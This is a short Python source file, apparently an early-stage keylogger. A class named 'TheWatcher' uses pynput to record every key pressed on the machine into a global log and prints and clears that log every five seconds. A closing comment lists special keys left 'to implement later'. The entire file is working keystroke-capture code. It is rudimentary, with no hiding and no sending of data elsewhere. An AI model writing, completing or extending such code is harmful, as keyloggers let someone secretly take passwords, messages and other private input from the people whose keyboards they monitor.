import pynput.keyboard as keyboard
import threading

log = ""

class TheWatcher:

 def callingBack(self, key):
  global log 
  try:
   log = log + str(key.char)
  except AttributeError:
   if key == key.space:
    log = log + " "
   else:
    log = log + " " + str(key) + " "

 def report(self):
  global log
  print(log)
  log = ""
  start_Timer = threading.Timer(5, self.report)
  start_Timer.start()

 def startWatcher(self):
  key_Listener = keyboard.Listener(on_press=self.callingBack)
  with key_Listener:
   self.report()
   key_Listener.join()

#Later to implement
#Key.backspace  Key.space  Key.enter  Key.up  Key.down  Key.left  Key.right  Key.ctrl  Key.cmd  Key.alt NoneNone Key.shift  Key.caps_lock  Key.caps_lock  Key.tab  Key.ctrl 
